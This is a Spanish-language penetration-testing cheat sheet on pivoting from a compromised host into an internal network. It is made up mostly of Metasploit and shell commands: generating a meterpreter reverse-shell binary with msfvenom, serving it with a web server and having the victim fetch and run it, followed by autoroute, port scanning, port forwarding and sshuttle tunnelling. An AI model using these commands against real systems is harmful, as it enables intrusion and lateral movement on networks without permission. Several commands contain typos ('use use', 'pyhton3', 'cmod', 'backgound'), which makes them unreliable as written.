Una vez ganemos acceso a una máquina víctima, haremos un ipconfig para ver si es que tiene otra interfaz de red, de ser el caso, deberemos de pivotear a las otras maquinas (Es necesario ser root).

## Windows

```bash
meterpreter > ipconfig
meterpreter > background

sessions -l

use windows/gather/arp_scanner # localizar IPs de red interna
set SESSION 1
set RHOSTS 10.10.10.4/24
run

use use multi/manage/autoroute # Canalizar trafico hacia máquina atacante
set SESSION 1
run

use scanner/portscan/tcp # Escaner de puertos tipo NMAP
set RHOSTS 10.10.10.5 # IP encontrada
run

use post/windows/manage/portproxy # Acceder a puertos de máquina victima
set CONNECT_ADDRESS 10.10.10.5
set CONNECT_PORT 80
set LOCAL_ADDRESS 0.0.0.0
set LOCAL_PORT 5000
set SESSION 1
run
```

En el navegador accederemos de la siguiente forma: 

``` http
ipVictimaIntermedia:5000
```

## Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=nuestraIP LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
pyhton3 -m http.server 80

wget nuestraIP/virus # Máquina intermedia

msfconsole
use /multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST nuestraIP
run

cmod +x virus # Máquina intermedia
./virus

meterpreter > ifconfig
meterpreter > background

sessions -l
use use multi/manage/autoroute
set SESSION 2
run
```

Script para ver maquinas en la red interna ya que metasploit falla:

```bash
#!bin/bash

for i in {1..255}; do
	timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
	if [ $? -eq 0 ]; then
		echo "El host 10.10.10.$i está activo"
	fi
done
```

```bash
sessions -i 2
meterpreter > shell
wget IPintermedia/scanner.sh # pyhton3 -m http.server 80
chmod +x scanner.sh
./scanner.sh

meterpreter > backgound
use scanner/portscan/tcp
set RHOSTS 10.10.10.8
run

sessions -i 2
meterpreter > portfwd add -l 222 -p 22 -r 10.10.10.8
meterpreter > portfwd add -l 5000 -p 631 -r 10.10.10.8

ssh dimitri@127.0.0.1 -p 222
http://127.0.0.1:5000
```

## SSH

Para esto es necesario que la máquina intermedia sea linux.

```bash
apt install sshuttle

sshutle -r user@maquinaIntermedia 10.10.10.0/24

http://10.10.10.11
```
